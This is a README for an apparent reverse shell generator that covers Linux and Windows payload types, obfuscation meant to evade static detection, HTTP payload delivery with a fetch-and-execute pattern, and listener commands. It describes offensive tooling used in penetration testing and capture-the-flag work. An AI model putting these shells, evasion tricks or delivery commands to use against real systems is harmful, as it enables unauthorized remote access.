# SimpleShell

A versatile reverse shell generator that simplifies the process of creating ready-to-use commands for various environments and languages. This tool provides a wide range of templates for both Windows and Linux, including threaded, encoded, and obfuscated options.

## Supported Shells

### Linux / Unix
- **bash**: Standard Bash reverse shell using `/dev/tcp`.
- **python-linux**: Python3 reverse shell using the `socket` and `os` modules.
- **perl**: Perl reverse shell using the `Socket` module.
- **php-linux**: PHP reverse shell using `fsockopen` and file descriptors.
- **java**: Java reverse shell using `Runtime.getRuntime().exec()`.
- **ruby**: Ruby reverse shell using `TCPSocket` and `spawn`.
- **socat**: Advanced Socat reverse shell for stable PTY.
- **golang**: Golang reverse shell (requires `go` on the target).
- **ncat**: Standard Ncat reverse shell using the `-e` flag.
- **openssl**: Encrypted reverse shell using OpenSSL and a FIFO pipe.

### Windows
- **powershell-tcp**: PowerShell reverse shell using `System.Net.Sockets.TCPClient`.
- **powershell-enc**: Base64 encoded PowerShell reverse shell.
- **python-windows**: Threaded Python reverse shell specifically for Windows.
- **php-windows**: PHP reverse shell using `proc_open` and `cmd.exe`.

## Features
- **Polymorphic Obfuscation**: Uses techniques like environmental slicing, hex-escaping, and backticking to evade static detection.
- **Built-in Web Server**: Can automatically serve the generated payload via HTTP for easy delivery (e.g., `iwr http://... | iex`).
- **Integrated Listener**: Option to automatically start a `nc`, `socat`, or `openssl` listener based on the chosen payload.
- **IP Mutation**: Can represent the listener IP in non-standard formats (like decimal) for additional evasion.

## Usage

### Required Parameters
- `--ip <IP/IFACE>`: The IP address or network interface (e.g., eth0) of the listener.
- `--port <PORT>`: The port of the listener.
- `--type <TYPE>`: The type of reverse shell to generate (see list above).

### General Options
- `--obfuscate`: Enable polymorphic mutation and obfuscation techniques.
- `--serve [PORT]`: Start a web server to serve the payload (default port 80).
- `--listen`: Automatically start the appropriate listener.
- `--raw`: Output only the raw payload command (useful for piping).
- `-l, --list`: List all available shell types with descriptions.
- `-h, --help`: Show the detailed help message.

### Examples

Generate a standard Bash reverse shell:
```bash
python3 simple_shell.py --ip 10.10.10.10 --port 443 --type bash
```

Generate an obfuscated PowerShell encoded shell and serve it on port 8080:
```bash
python3 simple_shell.py --ip eth0 --port 443 --type powershell-enc --obfuscate --serve 8080
```

Generate a Socat shell and automatically start the stable PTY listener:
```bash
python3 simple_shell.py --ip 10.10.10.10 --port 4444 --type socat --listen
```

## Recommended Listeners
The tool provides recommendations for listeners, including:
- Standard: `nc -lvnp <PORT>`
- Stable PTY: `socat TCP-LISTEN:<PORT>,reuseaddr,fork FILE:`tty`,raw,echo=0`
- Encrypted: `openssl s_server ...`
